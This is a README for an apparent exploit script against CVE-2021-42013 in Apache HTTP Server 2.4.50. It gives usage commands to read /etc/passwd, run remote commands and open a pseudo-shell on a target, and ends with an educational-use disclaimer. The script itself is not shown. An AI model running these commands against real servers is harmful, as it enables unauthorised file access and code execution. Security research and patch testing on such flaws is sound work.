# Project Title

Apache HTTP Server 2.4.50 - Local File Inclusion (LFI) & Remote Code Execution (RCE)

## Description

A python3 script for the CVE-2021-42013 - Apache HTTP Server 2.4.50 LFI & RCE. RCE requires cgi-bin to be enabled

## Getting Started

### Executing program

* LFI
```
python3 apache_2.4.50.py -t http://apache.hack/ -lfi /etc/passwd
```
* RCE
```
python3 apache_2.4.50.py -t http://apache.hack/ -rce whoami
```
* Pseudo-shell
```
python3 apache_2.4.50.py -t http://apache.hack/ -shell
```

## Help

For help menu:
```
python3 apache_2.4.50.py -h
```

## Disclaimer
All the code provided on this repository is for educational/research purposes only. Any actions and/or activities related to the material contained within this repository is solely your responsibility. The misuse of the code in this repository can result in criminal charges brought against the persons in question. Author will not be held responsible in the event any criminal charges be brought against any individuals misusing the code in this repository to break the law.